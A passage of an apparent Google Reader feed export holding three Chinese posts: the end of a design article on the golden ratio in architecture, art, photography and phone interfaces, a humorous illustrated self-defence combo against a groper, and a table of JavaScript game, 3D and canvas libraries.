\n<p>埃菲尔铁塔是一座纪念性建筑物，为了纪念法国大革命100周年，巴黎决定在1889年举办国际博览会，并要造一座永久性纪念建筑物。埃菲尔铁塔在1889年初建时，高度已达300米，是当时全世界最高的建筑物，直到1930年，仍是最高的（1959年在埃菲铁塔顶部增设广播天线，使塔高增加到320米。） 埃菲尔铁塔在距离地面57米，115米和276米处，各有一个平台，计算表明：（300-115）  300=0.617。所得比值与黄金比0.618相差甚微，由此可见，埃菲尔铁塔第二层平台的位置，非常接近于全塔高度的黄金分割点，从图中可以看出，第二层平台正是埃菲尔铁塔张开的四条腿开始收拢的转折点。埃及金字塔的高和底部边长是黄金比例。</p>\n \n<p><a rel=\"attachment wp-att-2463\" href=\"http://wsd.tencent.com/2011/02/golden_section.html/attachment/992\"></a><a rel=\"attachment wp-att-2464\" href=\"http://wsd.tencent.com/2011/02/golden_section.html/attachment/991\"></a></p>\n \n<p style=\"text-align:center\"><img src=\"http://img.ucdchina.com/upload/snap/2011-02/ff45b16ca0f0fb347cd8c50bd77e6c6f.jpeg\" alt=\"\" width=\"640\" height=\"177\"></p>\n \n<p>雕塑维纳斯的身体各部分也符合黄金比例。</p>\n \n<p style=\"text-align:center\"><a rel=\"attachment wp-att-2465\" href=\"http://wsd.tencent.com/2011/02/golden_section.html/weinasi1\"><img src=\"http://img.ucdchina.com/upload/snap/2011-02/a2793142cf3b60578dc122dbf06aa420.jpeg\" alt=\"\" width=\"180\" height=\"260\"></a></p>\n \n<p>五.绘画摄影</p>\n \n<p>蒙娜丽莎的微笑</p>\n \n<p>达·芬奇的“美丽密码”共有六大“法则”，其中包括脸的宽度必须是鼻宽的4倍；前额的宽度、鼻子的长度以及下颌骨长度必须都相等；研究人员吃惊地发现，“六大法则”中的5个都与现代人的审美标准奇迹般地吻合，只有一项关于“鼻子与嘴的比例”的法则与现代略有出入。小巧的嘴型是文艺复兴时期的审美标准，嘴的宽度是鼻宽的1.5倍被认为最完美。与之不同的是，研究发现，现代人普遍认为嘴宽与鼻宽的比例达到1.6的更美。达·芬奇的“美丽密码”要求如此严苛，以至于大多数普通人都不能全部符合其标准。因此研究人员也表示：“尽管这一研究结果显示脸部器官的大小、组合方式以及位置不同，都会对个人魅力产生影响。但一个人的美丽是一个复杂的组合，其中还涉及到其他许多因素。”</p>\n \n<p style=\"text-align:center\"><span><a rel=\"attachment wp-att-2468\" href=\"http://wsd.tencent.com/2011/02/golden_section.html/attachment/993\"><img src=\"http://img.ucdchina.com/upload/snap/2011-02/ad8663cc63fbbc1afbda55db5adb0bd6.jpeg\" alt=\"\" width=\"232\" height=\"327\"></a></span></p>\n \n<p><span>摄影的</span>九宫构图法</p>\n \n<p>       九宫构图顾名思议,将画面平均九等分,而四个交叉点侧是黄金点,拍摄时将主体放在图中四个交叉点中的任何一个点上,而不是放在画面的中心或接近中心的位置上.而四个点中,一般认为,右上方的点,是最理想的位置。</p>\n \n<p style=\"text-align:center\"><a rel=\"attachment wp-att-2469\" href=\"http://wsd.tencent.com/2011/02/golden_section.html/attachment/994\"><img src=\"http://img.ucdchina.com/upload/snap/2011-02/2ad14f08dc530b98486f54bbfaf4e2e0.jpeg\" alt=\"\" width=\"299\" height=\"215\"></a></p>\n \n<p>六.其他</p>\n \n<p>1.美剧中的黄金分割过场</p>\n \n<p>•盛开的花瓣中隐藏着蜻蜓的翅膀，花心是费马螺线组成，而螺线的排列与黄金分割和斐波那契数列相关。</p>\n \n<p>•青蛙的背后有希腊文第21个字母PHI(Φ)，这个字母用来代表黄金分割，1.6180339887。 </p>\n \n<p>•角的形状就是斐波纳契螺线，而仔细观察可以看到角上的数字，就是黄金分割数值Phi-Φ——1.6180</p>\n \n<p>•海马的身上图形是Fibonacci Spiral斐波纳契螺线，同时，螺线里面包含的线代表了黄金分割的比例。海马的尾部是Fibonacci Spiral，一些图片中还包括了L-histidine 组氨酸和L-proline脯氨酸的结构图。</p>\n \n<p><a rel=\"attachment wp-att-2470\" href=\"http://wsd.tencent.com/2011/02/golden_section.html/995-2\"></a><a rel=\"attachment wp-att-2471\" href=\"http://wsd.tencent.com/2011/02/golden_section.html/996-4\"></a><a rel=\"attachment wp-att-2472\" href=\"http://wsd.tencent.com/2011/02/golden_section.html/997-2\"></a><a rel=\"attachment wp-att-2473\" href=\"http://wsd.tencent.com/2011/02/golden_section.html/998-3\"></a></p>\n \n<p style=\"text-align:center\"><img src=\"http://img.ucdchina.com/upload/snap/2011-02/5ffd9e7fdecfab19e78454daa8db1017.jpeg\" alt=\"\" width=\"465\" height=\"463\"></p>\n \n<p>2.手机界面</p>\n \n<p>•Iphone宫格界面，每个图标都是57*57，图标宽度与图标顶部到下一排图标的高度的比例是黄金比例。</p>\n \n<p>•天语手机传统的九宫格形式，对屏幕也进行了视觉上的黄金分割。</p>\n \n<p>•WM6.5的蜂窝系统，六边形一方面最省空间，一方面也接近于黄金比例的5边型。</p>\n \n<p style=\"text-align:center\"><a rel=\"attachment wp-att-2474\" href=\"http://wsd.tencent.com/2011/02/golden_section.html/iphone2\"></a><img src=\"http://img.ucdchina.com/upload/snap/2011-02/a487b1dc4856121af7f6e446d733060c.jpeg\" alt=\"\" width=\"650\" height=\"348\"> <a rel=\"attachment wp-att-2475\" href=\"http://wsd.tencent.com/2011/02/golden_section.html/s98j3lgbx8yl\"></a> <a rel=\"attachment wp-att-2476\" href=\"http://wsd.tencent.com/2011/02/golden_section.html/attachment/20090911100843842\"></a></p>\n \n<p>关于黄金分割的总结就告一段落了，一些例子可以灵活的运用到设计当中，希望对看到这篇文章的同学们不管是设计或者PK都有所帮助。</p>\n \n<p>欢迎讨论，谢谢：）</p>\n \n<p>PS：小明的答案1.75*0.618-0.97=0.11米</p>\n<p><img src=\"http://img.ucdchina.com/upload/snap/2011-02/061c4fbae07ea34885b8cace94f8a579.gif\" border=\"0\" alt=\"\" width=\"0\" height=\"0\"></p>\n<p><a href=\"http://www1.feedsky.com/r/l/feedsky/wsdued/476482866/art01.html\"><img src=\"http://img.ucdchina.com/upload/snap/2011-02/a5b134b5a35a77420299a91777e79713.gif\" border=\"0\" alt=\"\"></a></p><p>相关话题：<a href=\"http://ucdchina.com/topic/363\">黄金分割在设计中的应用</a> 源地址：<a href=\"http://wsd.tencent.com/2011/02/golden_section.html\">http://wsd.tencent.com/2011/02/golden_section.html</a></p>"
    },
    "author" : "黄金体验",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://ucdchina.com/rss/all",
      "title" : "所有文章 - UCD大社区",
      "htmlUrl" : "http://ucdchina.com/rss/all"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1297698308807",
    "timestampUsec" : "1297698308807898",
    "id" : "tag:google.com,2005:reader/item/8cd571c5729b8db8",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read" ],
    "title" : "究极绝灭女子护身秘传六连技",
    "published" : 1295581647,
    "updated" : 1295581647,
    "alternate" : [ {
      "href" : "http://group.mtime.com/queen/discussion/1331688/",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<p>太给力了！</p>\n<p> </p>\n<p>一定要传播。。</p>\n<p> </p>\n<p>========================================</p>\n<p> </p>\n<p><img src=\"http://img21.mtime.cn/mg/2011/01/21/114408.83473825.jpg\"></p>\n<p> </p>\n<p>面对来袭色狼，大可气定神闲，面带微笑，以静制动。</p>\n<p> </p>\n<p><img src=\"http://img21.mtime.cn/mg/2011/01/21/114414.32470621.jpg\"></p>\n<p> </p>\n<p>待那禽兽近身后，弓腰，膝盖微曲，收紧肩颈肌肉。。。</p>\n<p> </p>\n<p><img src=\"http://img21.mtime.cn/mg/2011/01/21/114419.72913633.jpg\"></p>\n<p> </p>\n<p>然后双脚用力蹬起，身体伸直，用地球人最硬的头骨对那畜牲的下颚进行撞击，由于下颚神经丰富且靠近脑部，对其攻击容易造成晕眩甚至脑震荡</p>\n<p> </p>\n<p><img src=\"http://img21.mtime.cn/mg/2011/01/21/114425.85056706.jpg\"></p>\n<p> </p>\n<p>紧接着用双手抓住对方衣袖或手臂，再使用膝盖攻击地球男性最脆弱的部位，你知道我指的是哪里，不要害羞，视实际战况你甚至可以重复该攻击</p>\n<p> </p>\n<p><img src=\"http://img21.mtime.cn/mg/2011/01/21/114429.92894730.jpg\"></p>\n<p> </p>\n<p>待其痛苦不堪时，利用肘部攻击其脊椎骨或者肩胛骨。。。</p>\n<p> </p>\n<p><img src=\"http://img21.mtime.cn/mg/2011/01/21/114436.64243309.jpg\"></p>\n<p> </p>\n<p>顺势双手抱住其头部，再使用膝盖攻击面部或下颚，视现场情况可反复重复，技巧协调好的女士可以尝试左右膝盖交替攻击，对腿部塑形极有帮助</p>\n<p> </p>\n<p><img src=\"http://img21.mtime.cn/mg/2011/01/21/114440.93979413.jpg\"></p>\n<p> </p>\n<p>随后等其倒地后，举高腿部，再以脚后跟攻击肋部，基于势能转换动能原理，练过瑜伽的女士可发挥专长，尽量举高腿部，以获得更大的攻击强度</p>\n<p> </p>\n<p><img src=\"http://img21.mtime.cn/mg/2011/01/21/114444.73179366.jpg\"></p>\n<p> </p>\n<p>最后，作为六连技的华丽收尾，可以尽情使用脚部踩踏该受害者肋部，如穿着高跟鞋攻击效果更佳，尽显女王风范</p>\n<p> </p>\n<p>K.O！</p>\n<p> </p>\n<p><img src=\"http://img21.mtime.cn/mg/2011/01/21/114737.77333861.jpg\"></p>"
    },
    "author" : "老8",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.mtime.com/group/queen/feed.rss",
      "title" : "3P女王雷囧水俱乐部 – Mtime时光网",
      "htmlUrl" : "http://group.mtime.com/queen/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1297094917342",
    "timestampUsec" : "1297094917342679",
    "id" : "tag:google.com,2005:reader/item/e2d181614d0d854b",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "JS游戏引擎列表",
    "published" : 1295491388,
    "updated" : 1295491388,
    "alternate" : [ {
      "href" : "http://coolshell.cn/articles/3516.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<p>这里有一个<a rel=\"nofollow\" href=\"https://gist.github.com/768272\">网址</a>收集了关于JS游戏引擎开发库的一个列表，转过来。关于使用JS和HTML5做的一些小游戏，可参见《<a rel=\"nofollow\" href=\"http://coolshell.cn/articles/2998.html\">HTML5 小游戏展示</a>》</p>\n<h4>游戏引擎</h4>\n<table>\n<tbody>\n<tr>\n<th align=\"left\">Name</th>\n<th align=\"left\">Latest Release</th>\n<th align=\"left\">License</th>\n<th align=\"left\">Type</th>\n<th align=\"left\">Notes</th>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://renderengine.com/\">The Render Engine</a></td>\n<td align=\"left\">1.5.3</td>\n<td align=\"left\">MIT</td>\n<td align=\"left\"></td>\n<td align=\"left\">跨浏览器; 大规模 API; 开源. <a rel=\"nofollow\" href=\"http://renderengine.com/features.php\">2</a></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://gamequery.onaluf.org/\">gameQuery</a></td>\n<td align=\"left\">0.5.1</td>\n<td align=\"left\">CC BY-SA 2.5</td>\n<td align=\"left\"></td>\n<td align=\"left\">和 jQuery 一起使用</td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://game.tyler-dewitt.com/\">gTile</a></td>\n<td align=\"left\">0.0.1</td>\n<td align=\"left\"></td>\n<td align=\"left\">Tile based</td>\n<td></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://www.kesiev.com/akihabara/\">Akihabara</a></td>\n<td align=\"left\">1.3</td>\n<td align=\"left\">GPL2/MIT</td>\n<td align=\"left\">Classic Repro</td>\n<td align=\"left\">基于JS+HTML5的街机风格的游戏 <a rel=\"nofollow\" href=\"https://github.com/kesiev/akihabara\">3</a></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://www.lukewallin.co.uk/?go=engine\">The Javascript 2D Game Engine</a></td>\n<td align=\"left\"></td>\n<td align=\"left\">GPL</td>\n<td align=\"left\"></td>\n<td align=\"left\">注重于重力、物理、碰撞检测方面，使用HTML5 Canvas 和IE的ExplorerCanvas 低CPU消耗. <a rel=\"nofollow\" href=\"http://www.lukewallin.co.uk/?go=engine\">4</a></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://gogomakeplay.com/gmp\">The GMP Javascript Game Engine</a></td>\n<td align=\"left\">1.7.4 (2010-10-31)</td>\n<td align=\"left\">GPL2/MIT</td>\n<td align=\"left\"></td>\n<td align=\"left\">注重于数度的操作简化，”easy to learn and use” <a rel=\"nofollow\" href=\"http://gogomakeplay.com/gmp\">5</a></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://craftyjs.com/\">Crafty</a></td>\n<td align=\"left\">0.1</td>\n<td align=\"left\">GPL/MIT</td>\n<td align=\"left\"></td>\n<td align=\"left\">轻量级和模块化。 <a rel=\"nofollow\" href=\"http://craftyjs.com/\">6</a></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://www.effectgames.com/effect/\">Effect Games</a></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://www.propulsionjs.com/\">PropulsionJS</a></td>\n<td align=\"left\">1.1</td>\n<td align=\"left\">MIT</td>\n<td align=\"left\"></td>\n<td align=\"left\">使用 HTML5 Canvas. <a rel=\"nofollow\" href=\"http://www.propulsionjs.com/\">7</a></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://flax.ie/category/flax-game-engine/\">Flax</a></td>\n<td align=\"left\"></td>\n<td align=\"left\">Apache 2.0</td>\n<td align=\"left\"></td>\n<td align=\"left\">还没有released。使用 GWT 和 HTML5。关注于Linux和Mac OS上的Web游戏开发。<a rel=\"nofollow\" href=\"http://flax.ie/about/\">8</a></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"https://github.com/giancarlo/j5g3\">j5g3</a></td>\n<td align=\"left\"></td>\n<td align=\"left\">GPLv3</td>\n<td align=\"left\"></td>\n<td align=\"left\">还在开发过程中</td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://sites.google.com/site/cssgameengine/\">cssgameengine</a></td>\n<td align=\"left\"></td>\n<td align=\"left\"></td>\n<td align=\"left\"></td>\n<td align=\"left\">用于初学者。</td>\n</tr>\n</tbody>\n</table>\n<p><span></span></p>\n<table>\n<tbody>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://mccormick.cx/projects/jsGameSoup/\">jsGameSoup</a></td>\n<td align=\"left\">v74</td>\n<td align=\"left\">LGPLv3</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://www.sean.co.uk/a/webdesign/javascript_gamelib/javascript_gamelib.shtm\">Javascript Gamelib</a></td>\n<td align=\"left\">2.10</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://www.sarien.net/source\">Sarien.net interpreter</a></td>\n<td align=\"left\"></td>\n<td align=\"left\">GPL</td>\n<td align=\"left\">2D Adventure</td>\n<td></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://code.google.com/p/jgen/\">jGen</a></td>\n<td align=\"left\"></td>\n<td align=\"left\"></td>\n<td align=\"left\">Isometric</td>\n<td></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://www.isogenicengine.com/home/\">Isogenic Engine</a></td>\n<td align=\"left\"></td>\n<td align=\"left\"></td>\n<td align=\"left\">Isometric</td>\n<td></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://gammajs.org/\">GammaJS</a></td>\n<td align=\"left\">1.0</td>\n<td align=\"left\">MIT</td>\n<td align=\"left\">2.5D Platform</td>\n<td></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://www.codeproject.com/KB/scripting/TomsHallsJavascriptGame.aspx\">Tom’s Halls</a></td>\n<td align=\"left\">3.0</td>\n<td align=\"left\"></td>\n<td align=\"left\">Platform</td>\n<td></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"https://github.com/lostdecade/diggy\">Diggy</a></td>\n<td align=\"left\"></td>\n<td align=\"left\">BSD</td>\n<td align=\"left\"></td>\n<td align=\"left\">基于 DHTML, 正在暂停中</td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://impactjs.com/\">Impact</a></td>\n<td align=\"left\"></td>\n<td align=\"left\">Commercial ($99)</td>\n<td align=\"left\">2D</td>\n<td></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://rocketpack.fi/engine/\">Rocket Engine</a></td>\n<td align=\"left\"></td>\n<td align=\"left\">Commercial</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://www.wonderlandblog.com/wonderland/2010/04/aves-an-html-javascript-game-engine.html\">Aves</a></td>\n<td align=\"left\"></td>\n<td align=\"left\">Commercial?</td>\n<td align=\"left\"></td>\n<td></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"https://github.com/vonkow/Rosewood\">Rosewood</a></td>\n<td align=\"left\"></td>\n<td align=\"left\"></td>\n<td align=\"left\">2D</td>\n<td></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"https://github.com/RyanWilliams/cocos2d-javascript\">Cocos2D</a></td>\n<td align=\"left\"></td>\n<td align=\"left\">BSD</td>\n<td align=\"left\">2D</td>\n<td></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://gamejs.org/\">GameJS</a></td>\n<td align=\"left\"></td>\n<td align=\"left\">MIT</td>\n<td align=\"left\">2D</td>\n<td align=\"left\">CommonJs; 可以和 RingoJs server 整合，很像 PyGame; 仅支持Canvas;</td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://www.getxc.org/\">xc.js</a></td>\n<td align=\"left\"></td>\n<td align=\"left\">BSD</td>\n<td align=\"left\">2D</td>\n<td></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://code.google.com/p/vegalib/\">vegalib</a></td>\n<td align=\"left\"></td>\n<td align=\"left\"></td>\n<td align=\"left\">LPGL</td>\n<td></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://sourceforge.net/projects/clanfx/\">ClanFX</a></td>\n<td align=\"left\">0.0.1</td>\n<td align=\"left\"></td>\n<td align=\"left\">Tile based</td>\n<td></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://canvex.lazyilluminati.com/\">Canvex</a></td>\n<td align=\"left\"></td>\n<td align=\"left\">FPS</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"https://github.com/Osmose/bdge\">bdge</a></td>\n<td align=\"left\"></td>\n<td align=\"left\"></td>\n<td align=\"left\"></td>\n<td align=\"left\"><a rel=\"nofollow\" href=\"https://github.com/Osmose/Sub-C-Adventure\">Demo</a></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"https://github.com/mcgrue/js-verge\">js-verge</a></td>\n<td align=\"left\"></td>\n<td align=\"left\"></td>\n<td align=\"left\">2D</td>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://spriteright.com/\">Demo</a></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"https://github.com/BillyWM/FlixelJS\">FlixelJS</a></td>\n<td align=\"left\"></td>\n<td align=\"left\"></td>\n<td align=\"left\">2D</td>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://billy.wenge-murphy.com/flixel-js/testgame.html\">Demo</a> Port of Flixel (Flash) to JS. <a rel=\"nofollow\" href=\"http://flixel.org/forums/index.php?topic=2859.0\">Announcement thread</a>.</td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://unity3d.com/\">Unity3D</a></td>\n<td align=\"left\"></td>\n<td align=\"left\"></td>\n<td align=\"left\">Commercial (free version too)</td>\n<td align=\"left\">JS backend</td>\n</tr>\n</tbody>\n</table>\n<h4>3D 引擎</h4>\n<p>相比起成熟的游戏引擎来说，这些引擎没有包括诸如AI、声音、游戏逻辑、网络等等功能，不过，你可以使用别的一些JS库来辅助完成这些功能。</p>\n<table>\n<tbody>\n<tr>\n<th align=\"left\">Name</th>\n<th align=\"left\">Latest Release</th>\n<th align=\"left\">License</th>\n<th align=\"left\">Notes</th>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://deanm.github.com/pre3d/\">Pre3d</a></td>\n<td align=\"left\"></td>\n<td align=\"left\"></td>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://www.chromeexperiments.com/detail/monster/\">Demo</a></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"https://github.com/mrdoob/three.js\">three.js</a></td>\n<td align=\"left\"></td>\n<td align=\"left\">MIT</td>\n<td></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://www.c3dl.org/\">C3DL</a></td>\n<td align=\"left\">2.1 (?)</td>\n<td align=\"left\">MIT</td>\n<td></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://www.ambiera.com/copperlicht/\">CopperLicht</a></td>\n<td align=\"left\">1.3.2 (?)</td>\n<td align=\"left\"></td>\n<td></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://www.wxs.ca/js3d/\">JS3D</a></td>\n<td align=\"left\">0.1a (2007-02-05)</td>\n<td align=\"left\">GPL</td>\n<td></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://www.flashsandy.org/\">Sandy 3D</a></td>\n<td align=\"left\"></td>\n<td align=\"left\"></td>\n<td align=\"left\">由Haxe编辑成 JS</td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://code.google.com/p/o3d/\">O3D</a></td>\n<td align=\"left\"></td>\n<td>BSD</td>\n<td></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://www.glge.org/\">GLGE</a></td>\n<td align=\"left\">0.5.2</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://spidergl.org/\">SpiderGL</a></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h4>碰撞检测</h4>\n<ul>\n<li><a rel=\"nofollow\" href=\"http://code.google.com/p/box2dweb/\">http://code.google.com/p/box2dweb/</a> – 由 <a rel=\"nofollow\" href=\"http://www.box2d.org/\">Box2D</a> 移植成 JS</li>\n</ul>\n<h4>动画</h4>\n<table>\n<tbody>\n<tr>\n<th align=\"left\">Name</th>\n<th align=\"left\">Latest Release</th>\n<th align=\"left\">License</th>\n<th align=\"left\">Notes</th>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"https://github.com/batiste/sprite.js\">sprite.js</a></td>\n<td align=\"left\"></td>\n<td align=\"left\"><a rel=\"nofollow\" href=\"https://github.com/batiste/sprite.js/blob/master/LICENSE\">VIEW</a></td>\n<td align=\"left\">Created with goal of having common JS framework for dsktop and web. <a rel=\"nofollow\" href=\"http://www.htmlgoodies.com/daily_news/article.php/417990\">1</a></td>\n</tr>\n</tbody>\n</table>\n<h4>声音</h4>\n<ul>\n<li><a rel=\"nofollow\" href=\"http://www.schillmania.com/projects/soundmanager2/\">SoundManager2</a></li>\n</ul>\n<h4>图形</h4>\n<h3>Canvas</h3>\n<table>\n<tbody>\n<tr>\n<th align=\"left\">Name</th>\n<th align=\"left\">Size (KB)</th>\n<th align=\"left\">License</th>\n<th align=\"left\">IE</th>\n<th align=\"left\">SVG</th>\n<th align=\"left\">Docs</th>\n<th align=\"left\">Notes</th>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://code.google.com/p/canto-js/\">canto.js</a></td>\n<td align=\"left\">56</td>\n<td align=\"left\"></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://github.com/kangax/fabric.js/\">fabric.js</a></td>\n<td align=\"left\">97</td>\n<td align=\"left\"></td>\n<td align=\"left\">yes</td>\n<td align=\"left\">yes</td>\n<td align=\"left\">yes</td>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://kangax.github.com/fabric.js/test/demo/\">Demo</a></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://github.com/rsandor/gury/blob/master/gury.js\">gury.js</a></td>\n<td align=\"left\">10</td>\n<td align=\"left\"></td>\n<td align=\"left\"></td>\n<td align=\"left\"></td>\n<td align=\"left\">yes</td>\n<td></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://code.google.com/p/cakejs/\">CAKE</a></td>\n<td align=\"left\">211</td>\n<td align=\"left\"></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://forvar.de/js/mcl/\">Mootools Canvas Library (MCL)</a></td>\n<td align=\"left\">8</td>\n<td align=\"left\"></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"https://canvastoolkit.codeplex.com/\">HTML5 Canvas Library</a></td>\n<td align=\"left\">12</td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://code.google.com/p/layered-canvas-library/\">Layered Canvas Library (LCL)</a></td>\n<td align=\"left\">21</td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://github.com/davidbrooks/Artisan\">Artisan.js</a></td>\n<td align=\"left\">17</td>\n<td align=\"left\"></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://code.google.com/p/canvg/\">canvg</a></td>\n<td align=\"left\">78.3</td>\n<td align=\"left\"></td>\n<td align=\"left\"></td>\n<td align=\"left\">yes</td>\n<td align=\"left\">no</td>\n<td></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://github.com/F1LT3R/burst\">burst</a></td>\n<td align=\"left\">56</td>\n<td align=\"left\"></td>\n<td align=\"left\"></td>\n<td align=\"left\"></td>\n<td align=\"left\">yes</td>\n<td align=\"left\">没有维护了</td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://easeljs.com/\">easel.js</a></td>\n<td align=\"left\">33</td>\n<td align=\"left\">MIT</td>\n<td align=\"left\">no</td>\n<td align=\"left\">no</td>\n<td align=\"left\">yes</td>\n<td align=\"left\">尝试像Flash的DisplayList 一样在 Canvas 上创建图形。</td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://processingjs.org/\">processing.js</a></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"http://github.com/hapticdata/toxiclibsjs\">toxiclibsjs</a></td>\n<td align=\"left\"></td>\n<td align=\"left\">LPGL2.1</td>\n<td align=\"left\"></td>\n<td align=\"left\"></td>\n<td align=\"left\"></td>\n<td align=\"left\">和 processing.js 结合和很好</td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"https://github.com/hyperandroid/CAAT/\">CAAT</a></td>\n<td align=\"left\"></td>\n<td align=\"left\">MIT</td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"https://github.com/michael/unveil\">Unveil.js</a></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td align=\"left\"><a rel=\"nofollow\" href=\"https://github.com/biilly/doodle-js\">doodle.js</a></td>\n<td align=\"left\"></td>\n<td align=\"left\">BSD</td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<p>注意，文件尺寸比较并不一定准确，因为有些lib并没有压缩过。</p>\n<ul>\n<li><a rel=\"nofollow\" href=\"http://www.quasimondo.com/StackBlurForCanvas/StackBlurDemo.html\">Stackblur</a> – 在 Canvas 上实现模糊的效果</li>\n<li><a rel=\"nofollow\" href=\"http://www.pixastic.com/\">Pixastic</a> – 简单的图片操作</li>\n<li><a rel=\"nofollow\" href=\"http://raphaeljs.com/\">Raphaël</a> – 进行一些矢量图以及一些变化操作，能看<a rel=\"nofollow\" href=\"http://coolshell.cn/articles/3107.html\">这篇文章</a></li>\n<li><a rel=\"nofollow\" 